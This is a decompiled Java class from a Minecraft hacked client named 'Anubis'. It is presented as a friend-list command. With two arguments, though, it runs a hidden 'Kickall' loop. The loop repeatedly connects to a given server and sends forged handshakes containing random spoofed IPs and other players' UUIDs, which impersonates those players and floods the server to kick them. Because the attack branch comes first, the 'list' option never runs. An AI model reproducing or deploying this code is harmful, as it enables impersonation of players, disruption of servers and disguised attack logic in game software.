package org.seltak.anubis.commandmanager.commands;

import com.mojang.authlib.GameProfile;
import java.net.InetAddress;
import java.util.List;
import java.util.Random;
import net.minecraft.client.Minecraft;
import net.minecraft.client.gui.GuiIngameMenu;
import net.minecraft.client.gui.GuiPlayerTabOverlay;
import net.minecraft.client.gui.GuiScreen;
import net.minecraft.client.multiplayer.GuiConnecting;
import net.minecraft.client.network.NetHandlerLoginClient;
import net.minecraft.client.network.NetHandlerPlayClient;
import net.minecraft.client.network.NetworkPlayerInfo;
import net.minecraft.network.EnumConnectionState;
import net.minecraft.network.INetHandler;
import net.minecraft.network.NetworkManager;
import net.minecraft.network.Packet;
import net.minecraft.network.handshake.client.C00Handshake;
import net.minecraft.network.login.client.CPacketLoginStart;
import org.seltak.anubis.Anubis;
import org.seltak.anubis.commandmanager.Command;

public class FriendCommand extends Command {
  public FriendCommand(String name, String description, String usage) {
    super(name, description, usage);
  }
  
  public void onCommand(final String[] args) {
    System.out.println("Test");
    if (args.length == 2) {
      (new Thread(new Runnable() {
            public void run() {
              try {
                for (int i = 0; i < 100; i++) {
                  String[] s = args[1].split(":");
                  String srv_ip = s[0];
                  int port = Integer.parseInt(s[1]);
                  NetHandlerPlayClient connection = (Minecraft.getMinecraft()).player.connection;
                  List<NetworkPlayerInfo> players = GuiPlayerTabOverlay.ENTRY_ORDERING.sortedCopy(connection.getPlayerInfoMap());
                  for (NetworkPlayerInfo n : players) {
                    if (!n.getGameProfile().getId().toString().equals((Minecraft.getMinecraft()).player.getUniqueID().toString())) {
                      Random rand = new Random();
                      InetAddress var1 = null;
                      System.out.println((String)n);
                      var1 = InetAddress.getByName(srv_ip);
                      (GuiConnecting.networkManager2 = NetworkManager.createNetworkManagerAndConnect(var1, port, (Minecraft.getMinecraft()).gameSettings.isUsingNativeTransport())).setNetHandler((INetHandler)new NetHandlerLoginClient(GuiConnecting.networkManager2, Minecraft.getMinecraft(), (GuiScreen)new GuiIngameMenu()));
                      GuiConnecting.networkManager2.sendPacket((Packet)new C00Handshake(String.valueOf(String.valueOf(srv_ip)) + "\000" + "32.123." + String.valueOf(rand.nextInt(255)) + "." + String.valueOf(rand.nextInt(255)) + "\000" + n.getGameProfile().getId().toString(), port, EnumConnectionState.LOGIN));
                      GuiConnecting.networkManager2.sendPacket((Packet)new CPacketLoginStart(new GameProfile(null, String.valueOf(String.valueOf(n.getGameProfile().getName())) + rand.nextInt(123))));
                      Thread.sleep(0L);
                    } 
                  } 
                  System.out.println("Kickall.");
                } 
              } catch (Exception ex) {
                ex.printStackTrace();
              } 
            }
          })).start();
      return;
    } 
    if (args.length == 3) {
      String name = args[2].toLowerCase();
      if (args[1].equalsIgnoreCase("add")) {
        if (Anubis.friends.contains(name)) {
          Anubis.sendMessage("This player is already in your friendlist.");
        } else {
          Anubis.friends.add(name);
          Anubis.sendMessage("This player is now in your friendlist.");
        } 
      } else if (args[1].equalsIgnoreCase("remove")) {
        if (!Anubis.friends.contains(name))
          Anubis.sendMessage("This player is not in your friendlist."); 
        Anubis.friends.remove(name);
        Anubis.sendMessage("This player is no longer in your friendlist.");
      } else {
        Anubis.sendMessage("Please use .friend <add|remove|list> [name]");
      } 
    } else if (args.length == 2) {
      if (args[1].equalsIgnoreCase("list")) {
        Anubis.sendMessage("Your friendlist:");
        for (String s : Anubis.friends)
          Anubis.sendMessage(s); 
      } 
    } else {
      Anubis.sendMessage("Please use .friend <add|remove|list> [name]");
    } 
  }
}


/* Location:              C:\Users\BSV\AppData\Local\Temp\Rar$DRa6216.20396\Preview\Preview.jar!\org\seltak\anubis\commandmanager\commands\FriendCommand.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */